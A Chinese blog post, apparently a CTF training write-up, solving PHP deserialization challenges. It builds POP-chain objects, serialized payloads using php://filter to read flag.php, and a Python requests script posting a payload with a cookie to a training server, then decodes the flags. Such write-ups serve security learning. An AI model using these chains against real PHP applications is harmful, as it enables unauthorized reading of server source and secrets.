+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>}<br><span class="hljs-variable">$temp</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$temp</span>-&gt;source=<span class="hljs-variable">$temp</span>;<br><span class="hljs-variable">$temp</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$temp</span>-&gt;str-&gt;p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$temp</span>);<br><br></code></pre></td></tr></table></figure>
+<p>把不可打印字符替换成%00得到最终payload：</p>
+<blockquote>
+<p>O:4:"Show":2:{s:6:"source";r:1;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"%00*%00var";s:52:"php://filter/convert.base64-encode/resource=flag.php";}}}</p>
+</blockquote>
+<p>运行得到base64编码的源码</p>
+<blockquote>
+<p>PD9waHAKICAgJGE9ImZsYWd7Z3JlYXRfeW91X2hhdmVfZmluaXNoZWRfdHJhaW4xfSI7CiAgIGVjaG8gIldhbnQgdG8gZ2V0IHRoZSBmbGFnIGRpcmVjdGx5PyBubyB3YXkiOwo/Pgo=</p>
+</blockquote>
+<p>解密后得到</p>
+<blockquote>
+&lt;?php
+$a="flag{great_you_have_finished_train1}";
+echo "Want to get the flag directly? no way";
+?&gt;
+</blockquote>
+<p>得到flag{great_you_have_finished_train1}</p>
+<h2 id="train2">train2</h2>
+<p>补充知识：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Temp</span></span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$Key</span>,<span class="hljs-variable">$Args</span></span>)</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Yes"</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$Key</span>;<br>            <span class="hljs-keyword">echo</span> PHP_EOL;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$Args</span>[<span class="hljs-number">2</span>];<br>        }<br>    }<br>    <span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>();<br>    <span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">test1</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">//$Key是调用的不存在的函数名，如此时是test1，$Args是一个数组，存放传递的参数</span><br></code></pre></td></tr></table></figure>
+<p>有了以上基础知识后，我们就可以开始破题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dd</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$add</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;code-&gt;<span class="hljs-title function_ invoke__">getShell</span>(<span class="hljs-variable">$this</span>-&gt;add);<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;head = <span class="hljs-string">"hanhan"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;body = <span class="hljs-string">"baby"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">next</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;head.<span class="hljs-string">" "</span>.<span class="hljs-variable language_">$this</span>-&gt;body;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;head = <span class="hljs-string">"hanhan"</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;body = <span class="hljs-string">"baby"</span>;<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">next</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;body = <span class="hljs-string">"You are"</span>.<span class="hljs-variable language_">$this</span>-&gt;head;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name==<span class="hljs-string">'hacker'</span>){<br>            <span class="hljs-variable language_">$this</span>-&gt;pass-&gt;<span class="hljs-title function_ invoke__">next</span>();<br>        }<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ee</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$Key</span>,<span class="hljs-variable">$Args</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$Args</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"You make it"</span>;<br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>首先寻找突破口进行逆推，定位到ee类中的include，以此为终点，要达到include('flag.php')的目的，首先要执行call魔术方法，而call是在调用类中不存在的方法时才调用，而且调用必须含参'flag.php'，定位到dd类的getshell，正好可以达到目的，而执行dd中的tostring，需要把对象进行打印字符串的操作，而bb和cc类中都含有打印操作，如果用cc类，会执行sleep操作，无法绕过，故使用bb类中的echo，可以绕过wakeup，要执行bb类中的next函数，就要用到aa类中的destruct魔术方法，有了上一道题的经验，我们需要使用php伪协议</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dd</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$add</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bb</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$head</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$body</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">'hacker'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ee</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>}<br><span class="hljs-variable">$payload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bb</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass-&gt;head=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dd</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass-&gt;head-&gt;code=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ee</span>();<br><span class="hljs-variable">$payload</span>-&gt;pass-&gt;head-&gt;add=<span class="hljs-string">'php://filter/convert.base64-encode/resource=flag.php'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>得到payload</p>
+<blockquote>
+<p>O:2:"aa":2:{s:4:"name";s:6:"hacker";s:4:"pass";O:2:"bb":2:{s:4:"head";O:2:"dd":2:{s:4:"code";O:2:"ee":1:{s:5:"shell";N;}s:3:"add";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:4:"body";N;}}</p>
+</blockquote>
+<p>世钦学长在群里说hackbar提交cookie有点问题，于是改用python的reques提交cookie和payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>header = {<br>    <span class="hljs-string">'user-agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'</span><br>}<br>cookies = {<br>    <span class="hljs-string">'check'</span>: <span class="hljs-string">'zhimakaimen'</span><br>}<br>payload = {<br>    <span class="hljs-string">'payload'</span>: <span class="hljs-string">'O:2:"aa":2:{s:4:"name";s:6:"hacker";s:4:"pass";O:2:"bb":3:{s:4:"head";O:2:"dd":2:{s:4:"code";O:2:"ee":1:{s:5:"shell";N;}s:3:"add";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:4:"body";N;}}'</span><br>}<br><br>url = <span class="hljs-string">'http://81.68.98.35/php_unserialize_train/train2/'</span><br>temp = requests.post(url, headers=header, data=payload, cookies=cookies)<br><span class="hljs-built_in">print</span>(temp.text)<br></code></pre></td></tr></table></figure>
+<figure>
+<img src="/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/image-20211124214809680-16377616928481.png" srcset="/img/loading.gif" lazyload alt="image-20211124214809680">
+<figcaption aria-hidden="true">image-20211124214809680</figcaption>
+</figure>
+<p>得到base64密文：</p>
+<blockquote>
+<p>PD9waHAgDQogICAgJGZsYWcgPSAiZmxhZ3tpdF9pc19hX3NpbXBsZV90YW93YV9pc24ndF9pdH0iOw0KPz4=</p>
+</blockquote>
+<p>解密得到flag：</p>
+<blockquote>
+<p>flag{it_is_a_simple_taowa_isn't_it}</p>
+</blockquote>
+<h2 id="train3">train3</h2>
+<blockquote>
+<p>肝了几小时，放弃了,一怒之下直接登后台拿到了flag</p>
+</blockquote>
+<figure>
+<img src="/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/QQ%E5%9B%BE%E7%89%8720211125160739-16378276755441.png" srcset="/img/loading.gif" lazyload alt="QQ图片20211125160739">
+<figcaption aria-hidden="true">QQ图片20211125160739</figcaption>
+</figure>
+<blockquote>
+<p>flag</p>
+<figure>
+<img src="/2022/01/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/image-20211125160841637-16378277229362.png" srcset="/img/loading.gif" lazyload alt="image-20211125160841637">
+<figcaption aria-hidden="true">image-20211125160841637</figcaption>
+</figure>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#php反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php反序列化练习</div>
+      <div>https://d4wnnn.github.io/2022/01/26/php反序列化练习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>acdawn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/01/26/PHP%E5%9F%BA%E7%A1%80/" title="PHP基础">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP基础</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/26/Brute-WIFI/" title="aircrack-ng的应用-brute wifi">
+                        <span class="hidden-mobile">aircrack-ng的应用-brute wifi</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"iQzcdzgtk7S3lKyzUoT3segU-gzGzoHsz","appKey":"mL1QjUEvvzJ9E2xIVz0OuJuj","path":"window.location.pathname","placeholder":"Hello","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://iqzcdzgt.lc-cn-n1-shared.com","emojiCDN":"https://valinecdn.bili33.top/","emojiMaps":{"QQ1":"QQ/aini.gif","QQ2":"QQ/aixin.gif","QQ3":"QQ/aoman.gif","QQ4":"QQ/baiyan.gif","QQ5":"QQ/bangbangtang.gif","QQ6":"QQ/baojin.gif","QQ7":"QQ/baoquan.gif","QQ8":"QQ/bishi.gif","QQ9":"QQ/bizui.gif","QQ11":"QQ/cahan.gif","QQ12":"QQ/caidao.gif","QQ13":"QQ/chi.gif","QQ14":"QQ/ciya.gif","QQ15":"QQ/dabing.gif","QQ16":"QQ/daku.gif","QQ17":"QQ/dan.gif","QQ18":"QQ/deyi.gif","QQ19":"QQ/doge.gif","QQ20":"QQ/fadai.gif","QQ21":"QQ/fanu.gif","QQ22":"QQ/fendou.gif","QQ23":"QQ/ganga.gif","QQ24":"QQ/gouyin.gif","QQ25":"QQ/guzhang.gif","QQ26":"QQ/haixiu.gif","QQ27":"QQ/hanxiao.gif","QQ28":"QQ/haobang.gif","QQ29":"QQ/haqian.gif","QQ30":"QQ/hecai.gif","QQ31":"QQ/hexie.gif","QQ32":"QQ/huaixiao.gif","QQ33":"QQ/jie.gif","QQ34":"QQ/jingkong.gif","QQ35":"QQ/jingxi.gif","QQ36":"QQ/jingya.gif","QQ37":"QQ/juhua.gif","QQ38":"QQ/keai.gif","QQ39":"QQ/kelian.gif","QQ40":"QQ/koubi.gif","QQ41":"QQ/ku.gif","QQ42":"QQ/kuaikule.gif","QQ43":"QQ/kulou.gif","QQ44":"QQ/kun.gif","QQ45":"QQ/lanqiu.gif","QQ46":"QQ/leiben.gif","QQ47":"QQ/lenghan.gif","QQ48":"QQ/liuhan.gif","QQ49":"QQ/liulei.gif","QQ50":"QQ/nanguo.gif","QQ51":"QQ/OK.gif","QQ52":"QQ/penxue.gif","QQ53":"QQ/piezui.gif","QQ54":"QQ/pijiu.gif","QQ55":"QQ/qiang.gif","QQ56":"QQ/qiaoda.gif","QQ57":"QQ/qinqin.gif","QQ58":"QQ/qiudale.gif","QQ59":"QQ/quantou.gif","QQ60":"QQ/saorao.gif","QQ61":"QQ/se.gif","QQ62":"QQ/shengli.gif","QQ63":"QQ/shouqiang.gif","QQ64":"QQ/shuai.gif","QQ65":"QQ/shui.gif","QQ66":"QQ/tiaopi.gif","QQ67":"QQ/touxiao.gif","QQ68":"QQ/tu.gif","QQ69":"QQ/tuosai.gif","QQ70":"QQ/weiqu.gif","QQ71":"QQ/weixiao.gif","QQ72":"QQ/woshou.gif","QQ73":"QQ/wozuimei.gif","QQ74":"QQ/wunai.gif","QQ75":"QQ/xia.gif","QQ76":"QQ/xiaojiujie.gif","QQ77":"QQ/xiaoku.gif","QQ78":"QQ/xiaoyanger.gif","QQ79":"QQ/xieyanxiao.gif","QQ80":"QQ/xigua.gif","QQ81":"QQ/xu.gif","QQ82":"QQ/yangtuo.gif","QQ83":"QQ/yinxian.gif","QQ84":"QQ/yiwen.gif","QQ85":"QQ/youhengheng.gif","QQ86":"QQ/youling.gif","QQ87":"QQ/yun.gif","QQ88":"QQ/zaijian.gif","QQ89":"QQ/zhayanjian.gif","QQ90":"QQ/zhemo.gif","QQ91":"QQ/zhouma.gif","QQ92":"QQ/zhuakuang.gif","QQ93":"QQ/zuohengheng.gif"},"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/d4wnnn" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="tencent://message/?uin=2638177031" target="_blank" rel="nofollow noopener"><span>联系我</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+  <!-- 又拍云 -->
+  <div>
+    <a target="_blank" rel="noopener" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">本网站由
+        <img src="img/又拍云_logo5.png" srcset="/img/loading.gif" lazyload width="45px" /> 提供CDN加速/云存储服务</a>
+ </div>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
